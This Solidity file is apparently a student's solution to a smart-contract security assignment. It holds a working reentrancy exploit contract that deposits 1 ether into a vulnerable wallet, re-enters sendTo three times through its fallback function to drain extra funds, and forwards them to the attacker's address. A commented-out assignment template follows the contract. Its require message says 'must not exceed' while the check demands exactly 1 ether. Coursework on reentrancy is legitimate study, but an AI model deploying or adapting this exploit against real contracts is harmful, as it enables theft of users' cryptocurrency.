// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Interface for the vulnerable wallet
// interface WalletI {
//     function deposit() external payable;
//     function sendTo(address payable dest) external;
// }
import "./VulnerableWallet.sol";

contract WalletAttack {
    address payable public attacker; // The address of the attacker (caller)
    uint public numCalls; // Count of reentrancy calls

    constructor() {
        // Save the deployer address as the attacker
        attacker = payable(msg.sender);
    }

    // Function to exploit the vulnerable wallet
    function exploit(Wallet _target) public payable {
        require(msg.value == 1 ether, "Deposit must not exceed 1 ether");

        // Deposit the attacker's ether into the target wallet
        _target.deposit{value: msg.value}();

        // Start the reentrancy attack
        _target.sendTo(payable(address(this)));

        // Transfer stolen funds back to the attacker
        attacker.transfer(address(this).balance);
    }

    // Fallback function to enable reentrancy
    fallback() external payable {
        // Stop the attack after 3 reentrancy calls
        if (numCalls < 3) {
            numCalls++;
            Wallet(msg.sender).sendTo(payable(address(this)));
        }
    }
}


// pragma solidity ^0.8.19;

// import "./VulnerableWallet.sol";

// // interface WalletI {
// //     // This is the interface of the wallet to be attacked.
// //     function deposit() external payable;
// //     function sendTo(address payable dest) external;
// // }

// contract WalletAttack {
//     // A contract used to attack the Vulnerable Wallet.

//     constructor() {
//         // The constructor for the attacking contract.
//         // Do not change the signature
//     }

//     function exploit(Wallet _target) public payable {
//         // runs the exploit on the target wallet.
//         // you should not deposit more than 1 Ether to the vulnerable wallet.
//         // Assuming the target wallet has more than 3 Ether in deposits,
//         // you should withdraw at least 3 Ether from the wallet.
//         // The money taken should be sent back to the caller of this function)
//         // sentTo()
//     }

//     // you may add addtional functions and state variables as needed.
// }